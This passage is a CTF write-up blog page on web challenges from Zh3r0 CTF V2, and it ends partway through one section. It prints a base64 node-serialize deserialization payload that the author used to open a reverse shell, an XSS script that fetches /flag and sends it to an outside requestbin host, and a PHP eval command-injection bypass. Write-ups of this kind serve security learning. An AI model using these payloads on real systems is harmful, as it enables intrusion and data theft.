@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="This weekend, Peter and I participated in the Zh3r0 CTF V2 as icypete team. I only solved the many web challenge and He solved the web and misc. I had fun and finally got X th place.  (Web) sparta [1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zh3r0 CTF V2 Write Up">
+<meta property="og:url" content="http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="This weekend, Peter and I participated in the Zh3r0 CTF V2 as icypete team. I only solved the many web challenge and He solved the web and misc. I had fun and finally got X th place.  (Web) sparta [1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-06-06%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.29.44.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/poc.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/flag.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/check%20flag.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/feedback.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%201.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%202.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/strpos%20and%20substr/1.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/1.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/2.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/4.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/5.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/6.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store%20V2/1.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/waf.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/1.png?raw=true">
+<meta property="article:published_time" content="2021-06-06T19:10:02.000Z">
+<meta property="article:modified_time" content="2021-06-06T10:32:18.169Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-06-06%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.29.44.png?raw=true">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Zh3r0 CTF V2 Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/05/31/2021-05-31-Prototype-Pollution-in-JsonPatch/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&text=Zh3r0 CTF V2 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&is_video=false&description=Zh3r0 CTF V2 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Zh3r0 CTF V2 Write Up&body=Check out this article: http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&name=Zh3r0 CTF V2 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&t=Zh3r0 CTF V2 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-sparta-100-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) sparta [100 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-bxss-100-pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) bxss [100 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-strpos-and-substr-xxx-pts"><span class="toc-number">3.</span> <span class="toc-text">(Web) strpos and substr [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Original-Store-xxx-pts"><span class="toc-number">4.</span> <span class="toc-text">(Web) Original Store [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Original-Store-v2-xxx-pts"><span class="toc-number">5.</span> <span class="toc-text">(Web) Original Store v2 [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Baby-SSRF-xxx-pts"><span class="toc-number">6.</span> <span class="toc-text">(Web) Baby SSRF [xxx pts]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Zh3r0 CTF V2 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-06-06T19:10:02.000Z" itemprop="datePublished">2021-06-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-06-06%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.29.44.png?raw=true"></p>
+<p>This weekend, <a target="_blank" rel="noopener" href="http://reteps.github.io/">Peter</a> and I participated in the Zh3r0 CTF V2 as <code>icypete</code> team. I only solved the many web challenge and He solved the web and misc. I had fun and finally got X th place.</p>
+<hr>
+<h2 id="Web-sparta-100-pts"><a href="#Web-sparta-100-pts" class="headerlink" title="(Web) sparta [100 pts]"></a>(Web) sparta [100 pts]</h2><blockquote>
+<p>The sparta challenge is using the simple deserialization RCE vulnerability in node.js</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">escape</span> = <span class="built_in">require</span>(<span class="string">&#x27;escape-html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;home.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;loggedin.ejs&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/guest&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   res.render(<span class="string">&#x27;guest.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/guest&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (req.cookies.guest) &#123;</span><br><span class="line">   	<span class="keyword">var</span> str = <span class="keyword">new</span> Buffer(req.cookies.guest, <span class="string">&#x27;base64&#x27;</span>).toString();</span><br><span class="line">   	<span class="keyword">var</span> obj = serialize.unserialize(str);</span><br><span class="line">   	<span class="keyword">if</span> (obj.username) &#123;</span><br><span class="line">     	res.send(<span class="string">&quot;Hello &quot;</span> + <span class="built_in">escape</span>(obj.username) + <span class="string">&quot;. This page is currently under maintenance for Guest users. Please go back to the login page&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	 <span class="keyword">var</span> username = req.body.username </span><br><span class="line">	 <span class="keyword">var</span> country = req.body.country </span><br><span class="line">	 <span class="keyword">var</span> city = req.body.city</span><br><span class="line">	 <span class="keyword">var</span> serialized_info = <span class="string">`&#123;&quot;username&quot;:&quot;<span class="subst">$&#123;username&#125;</span>&quot;,&quot;country&quot;:&quot;<span class="subst">$&#123;country&#125;</span>&quot;,&quot;city&quot;:&quot;<span class="subst">$&#123;city&#125;</span>&quot;&#125;`</span></span><br><span class="line">     <span class="keyword">var</span> encoded_data = <span class="keyword">new</span> Buffer(serialized_info).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">	 res.cookie(<span class="string">&#x27;guest&#x27;</span>, encoded_data, &#123;</span><br><span class="line">       maxAge: <span class="number">900000</span>,</span><br><span class="line">       httpOnly: <span class="literal">true</span></span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> res.send(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(process.env.PORT || <span class="number">7777</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Listening on port 7777...&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>Look at the above code, You can see using the <code>unserialize()</code> method. <code>unserialize()</code> method is very vulnerable to <code>deserialization RCE</code>. But Server is very vulnerable because <code>not filtering</code> the argument(req.cookies.guest).</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/poc.png?raw=true"></p>
+<p>Look at the above photo, You can see occurring the RCE.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw1Miw0OSw0Niw0OSw1NCw1Miw0Niw1Myw1MCw0Niw1MCw0OCw1NSwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1Niw0OCwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>So, I get the reverse shell using the above poc code and read /flag.txt</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/flag.png?raw=true"></p>
+<blockquote>
+<p>FLAG : zh3r0{4ll_y0u_h4d_t0_d0_w4s_m0v3_th3_0bjc3ts_3mper0r}</p>
+</blockquote>
+<hr>
+<h2 id="Web-bxss-100-pts"><a href="#Web-bxss-100-pts" class="headerlink" title="(Web) bxss [100 pts]"></a>(Web) bxss [100 pts]</h2><blockquote>
+<p>The bxss challenge is steal flag in /flag using the Reflected XSS.</p>
+</blockquote>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/check%20flag.png?raw=true"></p>
+<p>First, When I send a request with /flag, able see the flag by only admin.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/feedback.png?raw=true"></p>
+<p>When I look at the feedback page, I able enter the feedback content. I’m just wondering and enter the <code>&lt;script&gt;location.href = &quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;&lt;/script&gt;</code> and requested.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%201.png?raw=true"></p>
+<p>I checked the requestbin and I saw that the receive the request in requestbin.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    fetch(<span class="string">&quot;/flag&quot;</span>).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?a=&quot;</span> + x));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>I immediately sent the above payload and read /flag</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%202.png?raw=true"></p>
+<blockquote>
+<p>FLAG : zh3r0</p>
+</blockquote>
+<hr>
+<h2 id="Web-strpos-and-substr-xxx-pts"><a href="#Web-strpos-and-substr-xxx-pts" class="headerlink" title="(Web) strpos and substr [xxx pts]"></a>(Web) strpos and substr [xxx pts]</h2><blockquote>
+<p>The strpos and substr challenge is get flag usint the simplel RCE. But a lot of filtering.</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;hello&#x27;;`ls`&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;hello&#x27;,`ls`&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>Above two payloads are same. So, I bypassed the <code>;</code> to <code>,</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,system  (&#39;head &#x2F;*&#39; ),&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/strpos%20and%20substr/1.png?raw=true"></p>
+<blockquote>
+<p>FLAG : zh3r0{W4RmUp_4_Fun_13333333337}</p>
+</blockquote>
+<hr>
+<h2 id="Web-Original-Store-xxx-pts"><a href="#Web-Original-Store-xxx-pts" class="headerlink" title="(Web) Original Store [xxx pts]"></a>(Web) Original Store [xxx pts]</h2><blockquote>
+<p>The Original Store challenge is steal admin cookie using the Reflected XSS. I solved using the unintended exploit</p>
+</blockquote>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/1.png?raw=true"></p>
+<p>First, I sign up and login</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/2.png?raw=true"></p>
+<p>After logging in, looking at the functions, there were not many. So When I go to /account.php, here checked the user information. When I went to /account.php, I thought I should check the user information after login as admin. So, I decided to steal the admin cookie using the xss and use it to check the /account.php.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/4.png?raw=true"></p>
+<p>When I checked requestbin after sent a <code>https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net</code> on the <code>http://35.200.166.215:5556/</code>, I was able to confirm that the request was received.</p>
+<p>So, I uploaded the xss poc to the private server and tried to attack, but it didn’t work…</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = URL;</span><br></pre></td></tr></table></figure>
+<p>Hm.. I thought that the server would handle it as above. So I just tried xss using <code>javascript:</code> scheme.</p>
